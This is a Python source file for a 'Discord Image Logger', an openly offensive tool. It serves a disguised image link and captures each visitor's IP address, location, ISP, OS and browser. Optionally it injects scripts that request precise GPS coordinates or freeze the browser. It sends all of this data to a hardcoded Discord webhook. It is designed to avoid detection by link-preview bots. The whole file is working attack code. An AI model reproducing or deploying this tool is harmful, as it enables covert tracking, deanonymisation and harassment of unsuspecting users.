"""
Discord Image Logger
A tool for logging IP addresses and system information via Discord's Open Original feature.
Author: DeKrypt | https://github.com/dekrypted
Version: v2.0
"""

import base64
import traceback
from http.server import BaseHTTPRequestHandler
from urllib import parse
from typing import Optional, Dict, Any, Tuple

import requests
import httpagentparser

# Application Metadata
__app__ = "Discord Image Logger"
__description__ = "Logs IP addresses and system information via Discord Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

# Configuration
CONFIG = {
    # Webhook Configuration
    "webhook": "https://discordapp.com/api/webhooks/1519697878333915258/7lk-7Jj6tgxGbrvykLVk4eAd9sk9LXrWA88d6uURY2UjgOrYKe-2s3mDMlj0pN4nxj_4",
    "username": "Image Logger",
    "color": 0x00FFFF,
    
    # Image Settings
    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
    "imageArgument": True,
    "buggedImage": True,
    
    # Message Settings
    "message": {
        "doMessage": True,
        "message": "Your IP has been logged",
        "richMessage": True,
    },
    
    # Privacy & Detection
    "vpnCheck": 1,  # 0=off, 1=ping only, 2=block
    "antiBot": 1,   # 0=off, 1=ping, 2=ping if hosting, 3=block hosting, 4=block hosting except proxies
    "accurateLocation": False,
    "linkAlerts": True,
    "crashBrowser": False,
    
    # Redirect Settings
    "redirect": {
        "redirect": True,
        "page": "https://example.com"
    },
}

# Blocked IP prefixes
BLACKLISTED_IPS = ("27", "104", "143", "164")

# Binary data for bugged image response
BINARIES = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}


def is_bot(ip: str, useragent: str) -> Optional[str]:
    """
    Check if the request is from a known bot service.
    
    Args:
        ip: The requester's IP address
        useragent: The requester's User-Agent string
        
    Returns:
        String identifying the bot service, or False if not a bot
    """
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def get_location_info(ip: str) -> Dict[str, Any]:
    """
    Fetch geolocation and network information for an IP address.
    
    Args:
        ip: The IP address to lookup
        
    Returns:
        Dictionary containing location and network information
    """
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        return response.json()
    except requests.RequestException:
        return {}


def format_embed_data(ip: str, useragent: str, location: Dict[str, Any], 
                      endpoint: str, url: Optional[str] = None) -> Dict[str, Any]:
    """
    Format the Discord embed data for the IP log report.
    
    Args:
        ip: The logged IP address
        useragent: The requester's User-Agent
        location: Location information dictionary
        endpoint: The endpoint that was accessed
        url: Optional image URL for thumbnail
        
    Returns:
        Formatted Discord webhook data
    """
    os_name, browser = ("Unknown", "Unknown")
    if useragent:
        os_name, browser = httpagentparser.simple_detect(useragent)
    
    embed_data = {
        "username": CONFIG["username"],
        "content": "",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": CONFIG["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{location.get('isp', 'Unknown')}`
> **ASN:** `{location.get('as', 'Unknown')}`
> **Country:** `{location.get('country', 'Unknown')}`
> **Region:** `{location.get('regionName', 'Unknown')}`
> **City:** `{location.get('city', 'Unknown')}`
> **Coords:** `{location.get('lat', 'Unknown')}, {location.get('lon', 'Unknown')}`
> **Timezone:** `{location.get('timezone', 'Unknown')}`
> **Mobile:** `{location.get('mobile', 'Unknown')}`
> **VPN:** `{location.get('proxy', 'Unknown')}`
> **Bot:** `{location.get('hosting', 'Unknown')}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}
""",
        }]
    }
    
    if url:
        embed_data["embeds"][0]["thumbnail"] = {"url": url}
    
    return embed_data


def send_webhook(data: Dict[str, Any], is_link_alert: bool = False) -> None:
    """
    Send data to the Discord webhook.
    
    Args:
        data: The webhook data to send
        is_link_alert: Whether this is a link alert message
    """
    try:
        if is_link_alert:
            data["embeds"][0]["title"] = "Image Logger - Link Sent"
            data["embeds"][0]["description"] = (
                f"An **Image Logging** link was sent in a chat!\n"
                f"You may receive an IP soon.\n\n"
                f"**Endpoint:** `{data.get('endpoint', 'N/A')}`\n"
                f"**IP:** `{data.get('ip', 'Unknown')}`\n"
                f"**Platform:** `{data.get('platform', 'Unknown')}`"
            )
        
        requests.post(CONFIG["webhook"], json=data, timeout=5)
    except requests.RequestException as e:
        print(f"Failed to send webhook: {e}")


def report_error(error: str) -> None:
    """Report an error to the Discord webhook."""
    error_data = {
        "username": CONFIG["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": CONFIG["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }]
    }
    send_webhook(error_data)


class ImageLoggerHandler(BaseHTTPRequestHandler):
    """HTTP request handler for the Image Logger service."""
    
    def _send_response(self, status_code: int, content_type: str, data: bytes) -> None:
        """Helper method to send an HTTP response."""
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(data)
    
    def _build_image_page(self, url: str) -> bytes:
        """Build the HTML page displaying the image."""
        html_template = f'''<style>
            body {{ margin: 0; padding: 0; }}
            div.img {{
                background-image: url('{url}');
                background-position: center center;
                background-repeat: no-repeat;
                background-size: contain;
                width: 100vw;
                height: 100vh;
            }}
        </style>
        <div class="img"></div>'''
        return html_template.encode()
    
    def _build_redirect_page(self, url: str) -> bytes:
        """Build an HTML page that redirects to the specified URL."""
        return f'<meta http-equiv="refresh" content="0;url={url}">'.encode()
    
    def _build_geolocation_script(self) -> bytes:
        """Build the JavaScript for geolocation capture."""
        return b"""
            <script>
            var currenturl = window.location.href;
            if (!currenturl.includes("g=")) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function (coords) {
                        var lat = coords.coords.latitude;
                        var lng = coords.coords.longitude;
                        var encoded = btoa(lat + "," + lng).replace(/=/g, "%3D");
                        var separator = currenturl.includes("?") ? "&" : "?";
                        location.replace(currenturl + separator + "g=" + encoded);
                    });
                }
            }
            </script>
        """
    
    def handle_request(self):
        """Main request handler."""
        try:
            forwarded_for = self.headers.get('x-forwarded-for')
            user_agent = self.headers.get('user-agent')
            path = self.path
            
            # Parse query parameters
            query_params = dict(parse.parse_qsl(parse.urlsplit(path).query))
            
            # Get image URL
            if CONFIG["imageArgument"]:
                if query_params.get("url"):
                    image_url = base64.b64decode(query_params["url"].encode()).decode()
                elif query_params.get("id"):
                    image_url = base64.b64decode(query_params["id"].encode()).decode()
                else:
                    image_url = CONFIG["image"]
            else:
                image_url = CONFIG["image"]
            
            # Check if this is a bot request
            bot_type = is_bot(forwarded_for, user_agent)
            
            # Log the request
            endpoint = path.split("?")[0]
            
            # Handle bot requests
            if bot_type:
                self._send_response(
                    200 if CONFIG["buggedImage"] else 302,
                    'image/jpeg' if CONFIG["buggedImage"] else 'text/html',
                    BINARIES["loading"] if CONFIG["buggedImage"] else self._build_redirect_page(image_url)
                )
                
                # Send link alert
                if CONFIG["linkAlerts"]:
                    alert_data = {
                        "endpoint": endpoint,
                        "ip": forwarded_for,
                        "platform": bot_type
                    }
                    send_webhook(alert_data, is_link_alert=True)
                return
            
            # Handle regular requests
            location_info = get_location_info(forwarded_for) if forwarded_for else {}
            
            # Check for geolocation data
            if query_params.get("g") and CONFIG["accurateLocation"]:
                geo_data = base64.b64decode(query_params["g"].encode()).decode()
                # Process geolocation data here if needed
            
            # Process location data
            result = location_info
            
            # Build response data
            if CONFIG["redirect"]["redirect"]:
                response_data = self._build_redirect_page(CONFIG["redirect"]["page"])
                content_type = 'text/html'
            elif CONFIG["message"]["doMessage"]:
                message = CONFIG["message"]["message"]
                if CONFIG["message"]["richMessage"] and result:
                    message = self._format_message_with_data(message, result, forwarded_for, user_agent)
                
                if CONFIG["crashBrowser"]:
                    message += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                
                response_data = message.encode()
                content_type = 'text/html'
            else:
                response_data = self._build_image_page(image_url)
                content_type = 'text/html'
            
            # Add geolocation script if enabled
            if CONFIG["accurateLocation"]:
                response_data += self._build_geolocation_script()
            
            # Send the response
            self._send_response(200, content_type, response_data)
            
            # Send the IP log to webhook
            embed_data = format_embed_data(forwarded_for, user_agent, result, endpoint, image_url)
            send_webhook(embed_data)
            
        except Exception as e:
            error_message = traceback.format_exc()
            self._send_response(500, 'text/html', 
                b'500 - Internal Server Error<br>Please check the Discord webhook for error details.')
            report_error(error_message)
    
    def _format_message_with_data(self, message: str, data: Dict[str, Any], 
                                  ip: str, useragent: str) -> str:
        """Replace placeholders in the message with actual data."""
        replacements = {
            "{ip}": ip or "Unknown",
            "{isp}": data.get("isp", "Unknown"),
            "{asn}": data.get("as", "Unknown"),
            "{country}": data.get("country", "Unknown"),
            "{region}": data.get("regionName", "Unknown"),
            "{city}": data.get("city", "Unknown"),
            "{lat}": str(data.get("lat", "Unknown")),
            "{long}": str(data.get("lon", "Unknown")),
            "{timezone}": data.get("timezone", "Unknown"),
            "{mobile}": str(data.get("mobile", "Unknown")),
            "{vpn}": str(data.get("proxy", "Unknown")),
            "{bot}": str(data.get("hosting", "Unknown")),
        }
        
        if useragent:
            os_name, browser = httpagentparser.simple_detect(useragent)
            replacements["{browser}"] = browser
            replacements["{os}"] = os_name
        
        for key, value in replacements.items():
            message = message.replace(key, value)
        
        return message
    
    do_GET = handle_request
    do_POST = handle_request


if __name__ == "__main__":
    print(f"{__app__} {__version__}")
    print(f"Author: {__author__}")
    print("Ready to handle requests...")
